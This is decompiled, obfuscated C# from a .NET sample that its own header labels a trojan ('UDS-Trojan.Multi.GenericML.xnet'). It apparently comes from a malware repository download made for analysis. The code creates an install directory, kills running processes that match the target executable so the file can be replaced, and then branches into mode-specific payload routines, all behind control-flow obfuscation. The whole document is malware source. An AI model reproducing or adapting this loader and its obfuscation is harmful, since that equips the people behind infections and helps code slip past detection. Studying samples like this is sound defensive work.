// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Jbkttgjy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2A819A-CCD1-40A6-A838-713DABA6E2A0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-Trojan.Multi.GenericML.xnet-ba0fec15d6c5e15df9fd3ac351711716a58c081b27b0f60fa90a77affd84a123.exe

using Jbkttgjy;
using System.Diagnostics;
using System.IO;
using System.Threading;

internal static class \u000F\u2003
{
  internal static void \u0002()
  {
    try
    {
      int num1 = !Liynqzii.\u0002().\u0002().\u0002() ? 1 : 0;
      if (true)
        goto label_2;
label_1:
      bool flag1;
      if (flag1)
        return;
      int num2 = \u0003\u2002.\u0002() ? 1 : (\u0003\u2002.\u0003() ? 1 : 0);
      if (true)
        goto label_6;
label_4:
      bool flag2;
      if (flag2)
        return;
      int num3 = !Liynqzii.\u0002().Directory.Exists ? 1 : 0;
      if (true)
        goto label_9;
label_8:
      bool flag3;
      if (flag3)
        Liynqzii.\u0002().Directory.Create();
      Thread.Sleep(200);
      if (!\u0003\u2002.\u0002(Liynqzii.\u0002().FullName))
      {
        try
        {
          Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Liynqzii.\u0002().Name));
          if (processesByName.Length != 0)
          {
            foreach (Process process in processesByName)
            {
              try
              {
                if (process.MainModule.FileName == Liynqzii.\u0002().FullName)
                  process.Kill();
              }
              catch
              {
              }
            }
            Thread.Sleep(200);
            \u0003\u2002.\u0002(Liynqzii.\u0002().FullName);
          }
        }
        catch
        {
        }
      }
      switch (Liynqzii.\u0002().\u0002().\u0002())
      {
        case \u000F\u2001.\u0003:
          \u0003\u2004.\u0002();
          return;
        case \u000F\u2001.\u0005:
          \u000E\u2003.\u0002();
          return;
        case \u000F\u2001.\u0008:
          \u0002\u2004.\u0002();
          return;
        default:
          return;
      }
label_9:
      flag3 = num3 != 0;
      goto label_8;
label_6:
      flag2 = num2 != 0;
      goto label_4;
label_2:
      flag1 = num1 != 0;
      goto label_1;
    }
    catch
    {
    }
  }
}
